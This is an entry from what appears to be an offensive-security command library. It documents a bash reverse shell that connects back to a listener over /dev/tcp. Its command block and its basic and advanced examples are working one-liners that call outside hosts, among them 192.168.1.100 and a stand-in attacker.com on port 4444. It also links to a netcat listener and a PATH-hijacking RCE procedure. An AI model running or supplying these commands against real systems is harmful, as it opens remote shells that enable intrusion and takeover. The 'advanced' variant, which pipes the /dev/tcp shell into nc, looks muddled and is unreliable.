---
id: cmd-uuid-008
data: bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
tags:
  - reverse-shell
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.841Z'
verified: false
validated: true
submitted: true
---
# bash-reverse-shell

## Command

```bash
bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
```

## Description

Spawns an interactive bash shell connecting back to a listener IP/port, redirecting I/O; run in background.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Interactive mode | Yes |
| `>&` | Redirect stdout/stderr | Yes |
| `/dev/tcp/...` | TCP target | Yes |
| `0>&1` | Redirect stdin | Yes |
| `&` | Background | Yes |

## Examples

### Basic Usage

```bash
bash -i >& /dev/tcp/192.168.1.100/443 0>&1 &
```

### Advanced Usage

```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1 | nc attacker.com 4444 &
```

## Expected Output

Establishes connection; interactive shell on listener.

## Related

- [[commands/sudo-nc-listen-443]]
- [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]
